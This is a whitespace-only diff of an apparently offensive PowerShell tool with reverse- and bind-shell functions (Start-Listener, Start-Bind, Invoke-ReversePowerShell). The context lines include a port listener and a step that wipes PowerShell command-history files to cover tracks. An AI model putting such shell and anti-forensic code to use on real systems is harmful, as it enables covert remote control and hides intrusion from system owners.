@@ -65,7 +65,7 @@ Function Start-Listener {
 
     $TCPProperties = [System.Net.NetworkInformation.IPGlobalProperties]::GetIPGlobalProperties()
     $Connections = $TCPProperties.GetActiveTcpListeners()
-    If ($Connections.Port -Contains "$Port") 
+    If ($Connections.Port -Contains "$Port")
     {
 
         Throw "[!] Port $Port is alreday in use by another process(es). Select another port to use or stop the occupying processes."
@@ -87,7 +87,7 @@ Function Start-Listener {
     If ($PSCmdlet.ShouldProcess($Socket.Start()))
     {
 
-        Try 
+        Try
         {
 
             Write-Output ("[*] Listening on [0.0.0.0] (port $PortString)")
@@ -107,9 +107,9 @@ Function Start-Listener {
                 Start-Sleep -Seconds 2
 
             }  # End While
-        
+
         }  # End Try
-        Finally 
+        Finally
         {
 
             If (!($Client.Connected))
@@ -247,11 +247,11 @@ Function Start-Bind {
 
         $TCPProperties = [System.Net.NetworkInformation.IPGlobalProperties]::GetIPGlobalProperties()
         $Connections = $TCPProperties.GetActiveTcpListeners()
-        If ($Connections.Port -Contains "$Port") 
+        If ($Connections.Port -Contains "$Port")
         {
-    
+
             Throw "[!] Port $Port is alreday in use by another process(es). Select another port to use or stop the occupying processes."
-    
+
         }  # End If
 
         Write-Verbose "Creating listener on port $PortString"
@@ -262,7 +262,7 @@ Function Start-Bind {
 
             Write-Output "[*] PowerShell.exe is bound to port $PortString"
 
-            Try 
+            Try
             {
 
                 While ($True)
@@ -281,13 +281,13 @@ Function Start-Bind {
                     Start-Sleep -Seconds 2
 
                 }  # End While
-            
+
             }  # End Try
-            Finally 
+            Finally
             {
 
                 Write-Output "[*] Press Ctrl + C a couple of times in order to reuse the port you selected as a listener again"
-                
+
                 $Client.Close()
                 $Listener.Stop()
 
@@ -524,7 +524,7 @@ Function Invoke-ReversePowerShell {
                             Write-Output "[*] Attempting to clear command history"
 
                             $CmdHistoryFiles = "$env:USERPROFILE\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadLine\Visual Studio Code Host_history.txt","$env:USERPROFILE\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadLine\Windows PowerShell ISE Host_history.txt","$env:USERPROFILE\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt"
-                            
+
                             Clear-History
                             Clear-Content -Path $CmdHistoryFiles -Force -ErrorAction SilentlyContinue
 
@@ -590,13 +590,13 @@ Function Invoke-ReversePowerShell {
                 $Stream.Flush()
 
             } # End While
-            
+
             $Client.Close()
 
             }  # End Bind Switch
 
             }  # End Switch
-    
+
         } # End Try
         Catch
         {
@@ -626,9 +626,9 @@ Function Invoke-ReversePowerShell {
     $Client.Close()
     If ($Listener)
     {
-    
+
         $Listener.Stop()
-    
+
     }  # End If
 
 } # End Function Invoke-ReversePowerShell
